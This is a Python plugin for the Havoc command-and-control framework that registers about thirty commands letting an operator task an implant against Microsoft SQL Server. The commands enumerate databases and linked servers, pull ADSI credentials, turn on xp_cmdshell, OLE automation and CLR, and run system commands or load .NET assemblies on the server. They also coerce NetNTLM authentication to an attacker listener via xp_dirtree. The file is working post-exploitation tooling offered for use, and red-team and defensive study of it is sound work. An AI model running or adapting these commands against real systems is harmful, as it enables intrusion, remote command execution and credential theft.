#
# Havoc Module
#
from havoc import Demon, RegisterCommand
from pathlib import Path
import hashlib

######
# Funcs for parameter parsing
######

def long_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        database = params[ 1 ]
    if num_params >= 3:
        linkserver = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)

    return packer.getbuffer()

def short_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    server      = ""
    database    = ""

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params == 1:
        server = params[ 0 ]
        database = ""
    if num_params == 2:
        server = params[ 0 ]
        database = params[ 1 ]

    packer.addstr(server)
    packer.addstr(database)

    return packer.getbuffer()


def toggle_rpc_parse_params( demon, params, value ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        linkedserver = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr("rpc")
    packer.addstr(value)

    return packer.getbuffer()


def toggle_mod_parse_params( demon, params, module, value ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        database = params[ 1 ]
    if num_params >= 3:
        linkserver = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(module)
    packer.addstr(value)

    return packer.getbuffer()


def command_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    command     = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        command = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        linkserver = params[ 3 ]
    if num_params >= 5:
        impersonate = params[ 4 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(command)

    return packer.getbuffer()


def rows_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    table       = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        table = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        linkserver = params[ 3 ]
    if num_params >= 5:
        impersonate = params[ 4 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(table)
    packer.addstr(linkserver)
    packer.addstr(impersonate)

    return packer.getbuffer()


def clr_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    dllpath     = ""
    function    = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 6:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 3:
        server      = params[ 0 ]
        dllpath     = params[ 1 ]
        function    = params[ 2 ]
    if num_params >= 4:
        database = params[ 3 ]
    if num_params >= 5:
        linkserver = params[ 4 ]
    if num_params >= 6:
        impersonate = params[ 5 ]

    dll = Path(dllpath)
    if not dll.is_file():
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"DLL {dllpath} not found" )
        return None
        
    dllbytes = dll.read_bytes()
    hash_obj = hashlib.sha512(dllbytes)
    digest = hash_obj.hexdigest()

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(function)
    packer.addstr(digest)
    packer.addbytes(dllbytes)

    return packer.getbuffer()


def adsi_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    adsiserver  = ""
    port        = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 6:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 2:
        server      = params[ 0 ]
        adsiserver  = params[ 1 ]
    if num_params >= 3:
        port = params[ 2 ]
    if num_params >= 4:
        database = params[ 3 ]
    if num_params >= 5:
        linkserver = params[ 4 ]
    if num_params >= 6:
        impersonate = params[ 5 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(adsiserver)
    packer.addstr(port)

    return packer.getbuffer()


def enum1434_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    server = ""

    if num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
        return None

    server = params[ 0 ]

    packer.addstr(server)

    return packer.getbuffer()
    

######
# Funcs for commands
######

def enum1434( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = enum1434_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to obtain SQL Server connection information" )

    demon.InlineExecute( TaskID, "go", f"1434udp/1434udp.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def adsi( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = adsi_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to obtain ADSI creds from ADSI linked server" )

    demon.InlineExecute( TaskID, "go", f"adsi/adsi.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def agentcmd( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute a system command using agent jobs" )

    demon.InlineExecute( TaskID, "go", f"agentcmd/agentcmd.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def agentstatus( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate SQL agent status and jobs" )

    demon.InlineExecute( TaskID, "go", f"agentstatus/agentstatus.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def checkrpc( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate RPC status of linked servers" )

    demon.InlineExecute( TaskID, "go", f"checkrpc/checkrpc.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def clr( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = clr_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to load and execute a .NET assembly in a stored procedure" )

    demon.InlineExecute( TaskID, "go", f"clr/clr.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def columns( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = rows_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate columns within a table" )

    demon.InlineExecute( TaskID, "go", f"columns/columns.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def databases( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate SQL databases" )

    demon.InlineExecute( TaskID, "go", f"databases/databases.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def disableclr( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "clr enabled", "0" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable CLR integration" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def disableole( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "Ole Automation Procedures", "0" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable OLE automation procedures" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def disablerpc( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_rpc_parse_params( demon, params, "FALSE" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable RPC and RPC out on a linked server" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def disablexp( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "xp_cmdshell", "0" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable xp_cmdshell" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def enableclr( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "clr enabled", "1" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enable CLR integration" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def enableole( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "Ole Automation Procedures", "1" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enable OLE automation procedures" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def enablerpc( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_rpc_parse_params( demon, params, "TRUE" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enable RPC and RPC out on a linked server" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def enablexp( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = toggle_mod_parse_params( demon, params, "xp_cmdshell", "1" )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enable xp_cmdshell" )

    demon.InlineExecute( TaskID, "go", f"togglemodule/togglemodule.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def info( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = short_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate SQL info" )

    demon.InlineExecute( TaskID, "go", f"info/info.{demon.ProcessArch}.o", packed_params, False )


def impersonate( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = short_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate users that can be impersonated" )

    demon.InlineExecute( TaskID, "go", f"impersonate/impersonate.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def links( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate linked servers" )

    demon.InlineExecute( TaskID, "go", f"links/links.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def olecmd( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute a system command using OLE automation procedures" )

    demon.InlineExecute( TaskID, "go", f"olecmd/olecmd.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def query( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute a custom SQL query" )

    demon.InlineExecute( TaskID, "go", f"query/query.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def rows( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = rows_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to gather SQL table rows" )

    demon.InlineExecute( TaskID, "go", f"rows/rows.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def search( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to gather SQL table Search" )

    demon.InlineExecute( TaskID, "go", f"search/search.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def smb( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to coerce NetNTLM auth via xp_dirtree" )

    demon.InlineExecute( TaskID, "go", f"smb/smb.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def tables( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate tables within a database" )

    demon.InlineExecute( TaskID, "go", f"tables/tables.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def users( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate users with database access" )

    demon.InlineExecute( TaskID, "go", f"users/users.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def whoami( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = long_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to gather logged in user, mapped user and roles" )

    demon.InlineExecute( TaskID, "go", f"whoami/whoami.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


def xpcmd( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = command_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute a system command via xp_cmdshell" )

    demon.InlineExecute( TaskID, "go", f"xpcmd/xpcmd.{demon.ProcessArch}.o", packed_params, False )

    return TaskID


RegisterCommand( enum1434,      "", "sql-1434udp",      "Obtain SQL Server connection information from 1434/UDP",   0, "[server IP]",                                                                                       "" )
RegisterCommand( adsi,          "", "sql-adsi",         "Obtain ADSI creds from ADSI linked server",                0, "[server] [ADSI_linkedserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]",   "" )
RegisterCommand( agentcmd,      "", "sql-agentcmd",     "Execute a system command using agent jobs",                0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
RegisterCommand( agentstatus,   "", "sql-agentstatus",  "Enumerate SQL agent status and jobs",                      0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( checkrpc,      "", "sql-checkrpc",     "Enumerate RPC status of linked servers",                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( clr,           "", "sql-clr",          "Load and execute .NET assembly in a stored procedure",     0, "[server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
RegisterCommand( columns,       "", "sql-columns",      "Enumerate columns within a table",                         0, "[server] [tables] [opt: database] [opt: linkedserver] [opt: impersonate]",                          "" )
RegisterCommand( databases,     "", "sql-databases",    "Enumerate SQL databases",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( disableclr,    "", "sql-disableclr",   "Disable CLR integration",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
RegisterCommand( disableole,    "", "sql-disableole",   "Disable OLE Automation Procedures",	                    0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
RegisterCommand( disablerpc,    "", "sql-disablerpc",	"Disable RPC and RPC out on a linked server",               0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
RegisterCommand( disablexp,     "", "sql-disablexp",    "Disable xp_cmdshell" ,                                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( enableclr,     "", "sql-enableclr",    "Enable CLR integration",                                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( enableole,     "", "sql-enableole",    "Enable OLE Automation Procedures",                         0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( enablerpc,     "", "sql-enablerpc",    "Enable RPC and RPC out on a linked server",                0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
RegisterCommand( enablexp,      "", "sql-enablexp",     "Enable xp_cmdshell",                                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( impersonate,   "", "sql-impersonate",  "Enumerate users that can be impersonated",                 0, "[server] [opt: database]",                                                                          "" )
RegisterCommand( info,          "", "sql-info",         "Gather information about the SQL server",                  0, "[server] [opt: database]",                                                                          "" )
RegisterCommand( links,         "", "sql-links",        "Enumerate linked servers",                                 0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( olecmd,        "", "sql-olecmd",       "Execute a system command using OLE automation procedures", 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
RegisterCommand( query,         "", "sql-query",        "Execute a custom SQL query",                               0, "[server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
RegisterCommand( rows,          "", "sql-rows",         "Get the count of rows in a table",                         0, "[server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
RegisterCommand( search,        "", "sql-search",       "Search a table for a column name",                         0, "[server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
RegisterCommand( smb,           "", "sql-smb",          "Coerce NetNTLM auth via xp_dirtree",                       0, "[server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]",                    "" )
RegisterCommand( tables,        "", "sql-tables",       "Enumerate tables within a database",                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( users,         "", "sql-users",        "Enumerate users with database access",                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( whoami,        "", "sql-whoami",       "Gather logged in user, mapped user and roles",             0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
RegisterCommand( xpcmd,         "", "sql-xpcmd",        "Execute a system command via xp_cmdshell",                 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
